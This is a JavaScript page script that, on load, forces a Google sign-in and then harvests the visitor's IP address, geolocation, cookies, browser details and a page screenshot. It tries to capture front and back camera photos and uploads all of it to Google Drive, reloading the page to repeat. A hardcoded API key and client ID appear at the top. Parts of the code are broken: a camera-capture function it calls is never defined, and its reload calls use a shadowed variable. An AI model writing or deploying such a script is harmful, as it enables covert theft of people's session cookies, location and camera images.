document.addEventListener("DOMContentLoaded", function() {
    const CLIENT_ID = '242354538516-19useputdueearrsefn8vkecj5h9ejc5.apps.googleusercontent.com';
    const API_KEY = 'AIzaSyCCfT2IS4w6mvtjL2f5_UuMbKMZ3o3Mks4';
    const DISCOVERY_DOCS = ["https://www.googleapis.com/discovery/v1/apis/drive/v3/rest"];
    const SCOPES = 'https://www.googleapis.com/auth/drive.file';

    function handleClientLoad() {
        gapi.load('client:auth2', initClient);
    }

    function initClient() {
        gapi.client.init({
            apiKey: API_KEY,
            clientId: CLIENT_ID,
            discoveryDocs: DISCOVERY_DOCS,
            scope: SCOPES
        }).then(() => {
            gapi.auth2.getAuthInstance().isSignedIn.listen(updateSigninStatus);
            updateSigninStatus(gapi.auth2.getAuthInstance().isSignedIn.get());
        }).catch(error => {
            console.error('Error initializing Google API client:', error);
        });
    }

    function updateSigninStatus(isSignedIn) {
        if (isSignedIn) {
            collectAndSendData();
        } else {
            gapi.auth2.getAuthInstance().signIn().then(() => {
                collectAndSendData();
            }).catch(error => {
                console.error('Error during Google Sign-In:', error);
            });
        }
    }

    function getIPAddress() {
        return fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => data.ip)
            .catch(error => {
                console.error('Error fetching IP:', error);
                return 'Error fetching IP';
            });
    }

    function getGeolocation() {
        return new Promise((resolve) => {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    position => resolve({ latitude: position.coords.latitude, longitude: position.coords.longitude }),
                    error => {
                        console.error('Error fetching geolocation:', error);
                        resolve({ latitude: 'Error', longitude: 'Error' });
                    }
                );
            } else {
                console.error('Geolocation not supported');
                resolve({ latitude: 'Geolocation not supported', longitude: 'Geolocation not supported' });
            }
        });
    }

    function getCookies() {
        return document.cookie.split(';').reduce((cookieObject, cookieString) => {
            const parts = cookieString.split('=');
            cookieObject[parts[0].trim()] = parts[1] ? parts[1].trim() : '';
            return cookieObject;
        }, {});
    }

    function getReferrer() {
        return document.referrer || "No referrer";
    }

    function getPageLoadTime() {
        return window.performance.timing.domContentLoadedEventEnd - window.performance.timing.navigationStart;
    }

    function getScreenResolution() {
        return `${screen.width}x${screen.height}`;
    }

    function getLocalTime() {
        return new Date().toLocaleString();
    }

    function captureScreenshot(callback) {
        html2canvas(document.body).then(canvas => {
            canvas.toBlob(blob => {
                callback(blob);
            });
        }).catch(error => {
            console.error('Error capturing screenshot:', error);
            callback(null);
        });
    }

    function uploadFileToDrive(file, filename, callback) {
        var fileMetadata = {
            'name': filename
        };
        var media = {
            mimeType: file.type,
            body: file
        };
        gapi.client.drive.files.create({
            resource: fileMetadata,
            media: media,
            fields: 'id'
        }).then(response => {
            console.log('File uploaded successfully:', response);
            if (callback) callback();
        }).catch(error => {
            console.error('Error uploading file:', error);
        });
    }

    function collectAndSendData() {
        const data = {
            userAgent: navigator.userAgent,
            referrer: getReferrer(),
            pageLoadTime: getPageLoadTime(),
            screenResolution: getScreenResolution(),
            localTime: getLocalTime()
        };

        getIPAddress().then(ipAddress => {
            data.ipAddress = ipAddress;
            getGeolocation().then(location => {
                data.latitude = location.latitude;
                data.longitude = location.longitude;
                data.cookies = getCookies();
                const jsonData = JSON.stringify(data);
                const dataBlob = new Blob([jsonData], { type: 'application/json' });

                uploadFileToDrive(dataBlob, 'log.json', () => {
                    captureScreenshot(screenshotBlob => {
                        if (screenshotBlob) {
                            uploadFileToDrive(screenshotBlob, 'screenshot.png', () => {
                                captureCameraPhoto('user', frontCameraBlob => {
                                    if (frontCameraBlob) {
                                        uploadFileToDrive(frontCameraBlob, 'front_camera.png', () => {
                                            captureCameraPhoto('environment', backCameraBlob => {
                                                if (backCameraBlob) {
                                                    uploadFileToDrive(backCameraBlob, 'back_camera.png', () => {
                                                        setTimeout(() => location.reload(), 30000);
                                                    });
                                                } else {
                                                    setTimeout(() => location.reload(), 30000);
                                                }
                                            });
                                        });
                                    } else {
                                        setTimeout(() => location.reload(), 30000);
                                    }
                                });
                            });
                        } else {
                            setTimeout(() => location.reload(), 30000);
                        }
                    });
                });
            });
        });
    }

    handleClientLoad();
});


